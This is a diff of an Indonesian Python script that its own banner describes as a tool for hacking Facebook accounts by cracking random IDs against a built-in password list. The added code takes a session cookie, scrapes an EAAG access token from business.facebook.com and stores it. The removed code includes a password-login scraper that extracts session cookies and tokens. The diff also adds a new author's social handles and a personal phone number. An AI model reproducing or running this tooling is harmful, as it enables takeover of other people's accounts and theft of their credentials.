@@ -1,9 +1,12 @@
-# code by Yayan XD
-# my facebook ( https://www.facebook.com/KM39453 )
-
-#      (C) Copyright 407 Authentic Exploit
-#      Rebuild Copyright Can't make u real programmer:)
-#      Coded By Yayan XD.
+#############[ AUTHOR STROVMIRVIASKA ]################
+#      [ Gausah Di apa - apain lagi Ntar Error ]     #
+#                [ Gunakan Dengan Baik ]             #   
+#              Author    = 'Strovmirviaska'          # 
+#     Facebook  = 'Teddy Cahyo Putra Pangembara'     #          
+#             Instagram = 'teddyyyy_11'              #
+#             Tiktok    = 'teddyyyy_11'              #
+#             Whatsapp  = '082290238779'             #
+######################################################  
 
 import os
 try:
@@ -169,6 +172,21 @@ def loading():
         sys.stdout.write(f"\r {N}[{H}•{N}] {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
         sys.stdout.flush()
     print("")
+
+def cuki():
+    jalan(f'[{K}•{N}] Selamat Datang Di Tools Saya...')
+    jalan(f'-> Tools ini dirancang untuk hacking account facebook menggunakan metode cracking, dimana ID akun akan di randomkan dengan password yang sudah di list pada program ini, Harap gunakan dengan bijak saya tidak akan bertanggung jawab Dengan apa yang akan terjadi kedepannya...')
+    print(f" {BM}NOTICE INFO !{N}")
+    print(f"[{K}1{N}] Silahkan Siapkan Akun Tumbal")
+    print(f"[{K}2{N}] Tools Ini Login Mengunakan Cookies")
+    print(f"[{K}3{N}] Ambil Cookie Dari Cookiedough")
+    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
+    for i in range(50):
+        time.sleep(0.1)
+        sys.stdout.write(f"\r{N}[{H}•{N}] {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
+        sys.stdout.flush()
+    print("")
+
 # LOGO
 def logo():
     print(f"""    
@@ -233,7 +251,6 @@ def cek_pw():
     except FileNotFoundError:
         os.system("clear")
         logo()
-        print(' [%s!%s] Pilih nomer 2 jika ada yang memperjual\n belikan SC META. SC ini %sGRATIS%s'%(M,N,H,N))
         print('\n %s%sOPTION MENU%s'%(BM,P,N))
         print(' [%s1%s] Already have SC Login Info'%(H,N))
         print(' [%s2%s] Send a message to the Author'%(H,N))
@@ -269,31 +286,44 @@ def kska():
         jalan(" %s[%s!%s] Sorry, wrong Password"%(N,M,N));time.sleep(1);cek_pw()
 
 #METODE LOGIN
+def login():
+    os.system('clear')
+    try:
+        token = open('.token.txt','r').read()
+        kukis = open('.cokie.txt','r').read()
+        tokenku.append(token)
+        try:
+            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':kukis})
+            sy2 = json.loads(sy.text)['name']
+            sy3 = json.loads(sy.text)['id']
+            moch_yayan(sy2,sy3)
+        except KeyError:
+            yayanxd()
+        except requests.exceptions.ConnectionError:
+            yayanxd()
+    except IOError:
+            yayanxd()
+
+
+#LOGIN KUE
+
 def yayanxd():
     os.system('clear')
-    logo()
-    r=requests.Session()
-    print(' %s%sChoose your login method%s'%(BM,P,N))
-    print(' [%s1%s] Login with EAAB Token (%sON%s)'%(H,N,H,N))
-    print(' [%s2%s] Login with Cookies (%sON%s)'%(H,N,H,N))
-    print(' [%s3%s] Login with ID & Password (%sON%s)'%(H,N,H,N))
-    print(' [%s4%s] Convert Cookies to EAAB Token (%sON%s)'%(H,N,H,N))
-    print(' [%s5%s] Send a message to the Author (%sChat%s)'%(H,N,H,N))
-    p = input(f"\n [{K}?{N}] Choose Login Method : ")
-    if p =="":
-        print(f"\n {N}[{M}!{N}] Dont be empty");time.sleep(3);yayanxd()
-    elif p in["1","01"]:
-        login_token()
-    elif p in["2","02"]:
-        login_cookie()
-    elif p in["3","03"]:
-        login_passwod()
-    elif p in["4","04"]:
-        convert_cookietotoken()
-    elif p in["5","05"]:
-        infoauthor()
-    else:
-        jalan(f"\n {N}[{M}!{N}] Sorry, it is wrong");time.sleep(2);yayanxd()
+    cuki()
+    try:
+        ___kontol___ = input('[|] Masukkan Cookies : ')
+        data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":___kontol___})
+
+        find_token = re.search("(EAAG\w+)", data.text)
+        ken=open(".token.txt", "w").write(find_token.group(1))
+        cok=open(".cokie.txt", "w").write(___kontol___)
+        print('\n Login Berhasil Jalankan Ulang Python run.py')
+        exit()
+    except Exception as e:
+        os.system("rm -f .token.txt")
+        os.system("rm -f .cokie.txt")
+        print('invalid')
+        exit()
 ###### INFO UPDATE & UPGRADE SC #####
 def infoauthor():
         print("%s══════════════════════════════════════════"%(N))
@@ -309,92 +339,6 @@ def infoauthor():
             jalan(' %s[%s✓%s] Retrun SC type "%spython run.py%s"'%(N,H,N,H,N));exit()
         else:
             exit(f"{N}[{M}×{N}] Sorry, it is wrong")
-#LOGIN TOKEN
-def login_token():
-    #print('\n %s[%s!%s] Gunakan Token EAAB yang Valid, jika menggunakan Token EAAB yang tidak valid mengakibatkan %sGAGAL DUMPID%s'%(N,M,N,M,N))
-    token = input(f"\n {N}[{K}?{N}] Enter EAAB Token : {A}")
-    loading()
-    try:
-        nama = requests.get(url_graph.format(f"/me?access_token={token}")).json()["name"]
-        open('.token.txt', 'a').write(token)
-        jalan('\n %s[%s✓%s] Sign in token %sSuccessful%s'%(N,H,N,H,N));time.sleep(1)
-        jalan(' %s[%s•%s] Welcome %s%s%s'%(N,H,N,K,nama,N));time.sleep(1)
-        jalan(' [%s!%s] Please use this sc properly, we are not responsible if this sc is misused...\n [%s•%s] WARNING : DILARANG MEMPERJUAL BELIKAN USERNAME & PASSWORD SC META.'%(M,N,H,N));time.sleep(3)
-        input('\n [%sPRESS ENTER%s] to continue'%(H,N))
-        os.system('xdg-open https://wa.me/601160610812?text=Hallo+izin+menggunakan+SC+ini')
-        moch_yayan()
-    except (AttributeError,KeyError):
-        jalan(f"\n {N}[{M}!{N}] Sign in token {M}Vailed{N}");yayanxd()
-    except UnboundLocalError:
-        jalan(f"\n {N}[{M}!{N}] Sign in token {M}Vailed{N}");yayanxd()
-    except requests.exceptions.ConnectionError:
-        jalan(f"\n {N}[{M}!{N}] Sorry No connection");yayanxd()
-# ------- LOGIN COOKIE --------
-def login_cookie():
-    cookie = input("\n %s[%s?%s] Enter Cookies : %s"% (N,K,N,A))
-    loading()
-    try:
-        ewee = ubah_cok(cookie)
-        token = ewee.get('token')
-        nama = requests.get(f"https://graph.facebook.com/me?access_token={token}").json()["name"]
-        open('.cokie.txt', 'a').write(cookie)
-        open('.token.txt', 'a').write(token)
-        jalan('\n %s[%s✓%s] Sign in Cookie %sSuccessful%s'%(N,H,N,H,N));time.sleep(3)
-        jalan(' %s[%s•%s] Welcome %s%s%s'%(N,H,N,K,nama,N));time.sleep(3)
-        jalan(' [%s!%s] Please use this sc properly, we are not responsible if this sc is misused...\n [%s•%s] WARNING : DILARANG MEMPERJUAL BELIKAN USERNAME & PASSWORD SC META.'%(M,N,H,N));time.sleep(3)
-        input('\n [%sPRESS ENTER%s] to continue'%(H,N))
-        os.system('xdg-open https://wa.me/601160610812?text=Hallo+izin+menggunakan+SC+ini')
-        moch_yayan()
-    except AttributeError:
-        jalan('\n %s[%s×%s] Sign in Cookie %sVailed%s'%(N,M,N,M,N));time.sleep(1);yayanxd()
-    except UnboundLocalError:
-        jalan('\n %s[%s×%s] Sign in Cookie %sVailed%s'%(N,M,N,M,N));time.sleep(1);yayanxd()
-    except requests.exceptions.ConnectionError:
-        jalan('\n %s[%s!%s] Sorry No connection'%(N,M,N));time.sleep(1);yayanxd()
-#LOGIN PASSWORD
-def login_passwod():
-    session=requests.Session()
-    user = input(f"\n {N}[{H}•{N}] Enter ID/Username : {H}")
-    pasw = input(f" {N}[{H}•{N}] Enter Password : {H}")
-    loading()
-    try:
-        session=requests.Session()
-        header = {"Host":"mbasic.facebook.com", "origin":"https://mbasic.facebook.com", "upgrade-insecure-requests" : "1",
-        "user-agent":"Mozilla/5.0 (Linux; Android 11; Nokia 3.2) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36",
-        "content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-user": "empty","sec-fetch-dest": "document","referer": url_mb,"accept-encoding": "gzip, deflate br","accept-language":bahasa}
-        cin = session.get("https://www.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
-        das = {"lsd":re.search('name="lsd" value="(.*?)"', str(cin.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(cin.text)).group(1),"uid":user,"flow":"login_no_pin","pass":pasw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
-        yan = session.post("https://www.facebook.com/login/device-based/validate-password/?shbl=0", data = das, headers = header, allow_redirects = False)
-        if 'c_user' in session.cookies.get_dict():
-            cooz = session.cookies.get_dict()
-            coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
-            try:ewee = ubah_cok(coki)
-            except UnboundLocalError:jalan(" [%s×%s] ID/Username & Password not correct"%(M,N));login_passwod()
-            #ikeh = ewee.get('ikeh')
-            token = ewee.get('token')
-            nama = session.get(f"https://graph.facebook.com/me?access_token={token}").json()["name"]
-            #open('.token.txt', 'a').write(ikeh)
-            open('.token.txt', 'a').write(token)
-            open('.cokie.txt', 'a').write(coki)
-            jalan('\n %s[%s✓%s] Sign in ID/Username & Password %sSuccessful%s'%(N,H,N,H,N));time.sleep(2)
-            jalan(' %s[%s•%s] Welcome %s%s%s'%(N,H,N,K,nama,N));time.sleep(2)
-            jalan(' [%s!%s] Please use this sc properly, we are not responsible if this sc is misused...\n [%s•%s] WARNING : DILARANG MEMPERJUAL BELIKAN USERNAME & PASSWORD SC META.'%(M,N,H,N));time.sleep(3)
-            jalan(f"\n [{M}!{N}] Displaying cookies and tokens");time.sleep(4)
-            print(f" [{H}✓{N}] Cookie : {H}{coki}{N}");time.sleep(2)
-            print(f" [{H}✓{N}] Token  : {H}{ewee.get('token')}{N}");time.sleep(2)
-            input('\n [%sPRESS ENTER%s] to continue'%(H,N))
-            os.system('xdg-open https://wa.me/601160610812?text=Hallo+izin+menggunakan+SC+ini')
-            moch_yayan()
-        elif 'checkpoint' in session.cookies.get_dict():
-            jalan(f"\n [{M}!{N}] Sorry account {K}Checkpoint{N}")
-        else:
-            jalan(f"\n [{M}×{N}] Sign in Cookie {M}Vailed{N}");yayanxd()
-    except (AttributeError,KeyError):
-        jalan(f"\n [{M}×{N}] Sign in Cookie {M}Vailed{N}");yayanxd()
-    except UnboundLocalError:
-        jalan(f"\n [{M}×{N}] Sign in Cookie {M}Vailed{N}");yayanxd()
-    except requests.exceptions.ConnectionError:
-        jalan(f"\n {N}[{M}!{N}] Sorry no connection")
 # ----- UBAH COOKIE -------
 def ubah_cok(cookie):
     headers = {
@@ -1059,5 +1003,5 @@ class __crack__:
             print(f"\n {N}[{M}!{N}] Correct input");self.kombinasi_pw(url)
 
 if __name__ == '__main__':
-    cek_pw();moch_yayan()
+    login();moch_yayan()
     #cek_pw()
